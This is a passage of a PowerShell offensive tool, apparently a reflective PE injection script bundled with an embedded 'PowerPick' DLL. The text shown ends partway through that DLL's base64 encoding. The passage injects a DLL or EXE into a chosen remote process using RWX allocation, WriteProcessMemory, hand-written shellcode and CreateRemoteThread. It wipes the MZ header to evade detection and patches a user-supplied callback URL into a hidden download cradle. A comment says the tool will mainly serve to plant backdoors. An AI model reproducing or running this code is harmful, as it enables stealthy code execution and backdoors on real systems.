			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		
		#Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
			[Byte[]]$RawBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
			write-verbose "64 Bit Injection"
        }
        else
        {
            [Byte[]]$RawBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
			write-verbose "32 Bit Injection"
        }
		#REPLACING THE CALLBACK BYTES WITH YOUR OWN
		##############
		
		#Search the bytes for the pattern
		$len = 0
		for ($i=0; $i -lt $RawBytes.Length-1; $i++)
		{
			#look for bytes 0x0041 which is a unicode A
			if(($RawBytes[$i] -eq [byte]0x00) -and ($RawBytes[$i+1] -eq [byte]0x41))
			{
				$i++
				$len++
				#check if you have reached the complete pattern length. 48 As
				if($len -ge 48)
				{
					#Found a match. mark the start as 94 bytes ago
					$start=$i-94
					write-verbose "Matched pattern at index: $start"
					break
				}
			}
			else
			{
				$len = 0
			}
		}
		$end = $start+($CallbackURI.Length*2)-1
		#Get the bytes for the user defined CB URL
		
		$CBBytes = [System.Text.Encoding]::Unicode.GetBytes($CallbackURI)
		
		#Replace the bytes
		for ($i=0; $i -lt $CBBytes.Length; $i++)
		{
			$RawBytes[$start+$i] = $CBBytes[$i]
		}
		
		#Add a ") onto the end of the CB string to close out the download cradle
		$i--
		#"
		$RawBytes[$start+$i] = [byte]0x00
		$RawBytes[$start+$i+1] = [byte]0x22
		#)
		$RawBytes[$start+$i+2] = [byte]0x00
		$RawBytes[$start+$i+3] = [byte]0x29
		#)
		$RawBytes[$start+$i+4] = [byte]0x00
		$RawBytes[$start+$i+5] = [byte]0x29
		#)
		$RawBytes[$start+$i+6] = [byte]0x00
		$RawBytes[$start+$i+7] = [byte]0x29
		#)
		$RawBytes[$start+$i+8] = [byte]0x00
		$RawBytes[$start+$i+9] = [byte]0x29
		#NULL
		$RawBytes[$start+$i+10] = [byte]0x00
		$RawBytes[$start+$i+11] = [byte]0x00
		
		#Display the new string to the user if in verbose mode
		$NewCB=[System.Text.Encoding]::Unicode.GetString($RawBytes[$start..$end])
		write-verbose "Replaced pattern with: $NewCB"
		$PEBytes = $RawBytes
		
		#replace the MZ Header
		$PEBytes[0] = 0
        $PEBytes[1] = 0
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	Write-Verbose "PowerShell ProcessID: $PID"
	if ($ProcId)
	{
		Write-Verbose "Remote Process: $ProcID"
	}
	#PowerPick DLLS
	$PEBytes64 = "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